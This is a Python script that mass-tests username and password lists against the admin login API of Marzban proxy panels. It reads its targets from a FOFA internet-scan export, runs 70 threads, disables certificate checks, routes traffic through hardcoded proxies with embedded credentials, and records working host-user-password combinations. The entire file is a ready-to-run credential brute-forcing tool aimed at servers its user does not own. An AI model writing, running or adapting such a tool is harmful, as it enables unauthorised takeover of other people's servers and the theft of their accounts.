import concurrent.futures
import os
import requests
from requests.exceptions import Timeout
from flask import Flask
from keep_alive import keep_alive
import time
import urllib3
from datetime import datetime

keep_alive()
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

auth = "b.txt"#"admin.txt"#cred.txt
with open(auth, "r") as credentials:
  credential = credentials.read().splitlines()

Good = open("Good.txt", "a")
Bad = open("Bad.txt", "a")
Time_out = open("Time_out.txt", "w")
exception = open("Exception.txt", "w")


class colors:
  LGREEN = '\033[38;2;129;199;116m'
  LBLUE = '\033[38;5;111m'
  LRED = '\033[38;2;239;83;80m'
  LPURPLE = '\033[38;2;148;73;209m'
  RESET = '\u001B[0m'
  LXC = '\033[38;2;255;152;0m'
  GREY = '\033[38;2;158;158;158m'
  LYELLOW = '\033[38;2;255;255;0m'
  LLIME = '\033[38;2;0;255;0m'


timeout = 0
good = 0
bad = 0
execption = 0
total = 0

ti = datetime.now()
def display():
  os.system('clear')
  print(ti)
  print(f"{colors.LYELLOW} total         =>  {total} {colors.RESET}")
  print(f"{colors.LBLUE} timeout       =>  {timeout} {colors.RESET}")
  print(f"{colors.LGREEN} good          =>  {good} {colors.RESET}")
  print(f"{colors.LRED} bad           =>  {bad} {colors.RESET}")
  print(f"{colors.LPURPLE} execption  =>  {execption} {colors.RESET}")

  print(datetime.now())

ip_file = "fofa(marzban).txt"
with open(ip_file, "r") as url:
  url2 = url.readlines()
URL = url2
proxy = {
    'http': 'http://root:root@198.23.137.251:11236',
    #'http': 'http://root:root@66.135.30.124:38633',
    #'http': 'http://root:root@154.17.12.106:17868',
    #'https': 'https://root:root@154.17.12.106:17868',
    #'http': 'http://ohxqlmfa:txxtblnwv860@38.154.227.167:5868',
}


def Marzban(url3):
  global good
  global bad
  global execption
  global timeout
  global total

  total += 1
  #display()
  #print(f"{colors.GREY}=> {colors.RESET} {colors.LYELLOW} {url3}")
  url4 = f'https://{url3}/api/admin/token'.strip()
  isnt_finished = False
  try:
    for i in credential:
      try:

        User = i.split("|")[0].strip()
        Pass = i.split("|")[1].strip()
        # Text data
        text_data = {
            'username': User,
            'password': Pass,
        }

        # Specify boundaries
        boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW'

        # Create the headers with the specified boundary
        headers = {'Content-Type': f'multipart/form-data; boundary={boundary}'}

        # Construct the payload
        payload = ''
        for key, value in text_data.items():
          payload += f'--{boundary}\r\n'
          payload += f'Content-Disposition: form-data; name="{key}"\r\n\r\n'
          payload += f'{value}\r\n'

        # Add the final boundary
        payload += f'--{boundary}--'

        # Send the request
        with requests.post(url4,
                           headers=headers,
                           data=payload,
                           timeout=30,
                           verify=False) as response:

          if response.json().get("access_token"):
            print(
                f"{colors.GREY}=> {colors.RESET} {colors.LGREEN} successful : {url3}|{User}|{Pass} {colors.RESET} {colors.LGREEN} "
            )
            Good.write(f"{url3}|{User}|{Pass}")
            Good.flush()
            good += 1
            #display()
            isnt_finished = True
            break
          elif "Incorrect" in response.json().get("detail").strip():
            #print(f"{colors.GREY}=> {colors.RESET}  {colors.LRED} failed :{url{colors.RESET}")
            #display()
            continue
          else:
            #print(f"{colors.GREY}=> {colors.RESET} {colors.LPURPLE} Exeption occured : {url3} {response.text} {colors.RESET} ")
            isnt_finished = True
            break
            
      except Timeout:
        isnt_finished = True
        Time_out.write(url3)
        Time_out.flush()
        #print(f"{colors.GREY} => {colors.RESET}  {colors.LBLUE} Timeout : {url3} {colors.RESET}")
        timeout += 1
        #display()
        break

      except Exception:
        execption += 1
        #display()
        isnt_finished = True
        exception.write(url3)
        #print(f"{colors.GREY} => {colors.RESET} {colors.LPURPLE} Exception :  {url3} {colors.RESET}")
        break
        
  finally:
    if (isnt_finished == False):
      #print(f"{colors.GREY}=> {colors.RESET} {colors.LRED} Failed : {url3} {colors.RESET} ")
      bad += 1
      #display()
      Bad.write(url3)
      Bad.flush()  
    display()
def main():

  with concurrent.futures.ThreadPoolExecutor(
      max_workers=70) as executor:  #Adjust max_workers as needed
    executor.map(Marzban, url2)


if __name__ == "__main__":
  main()
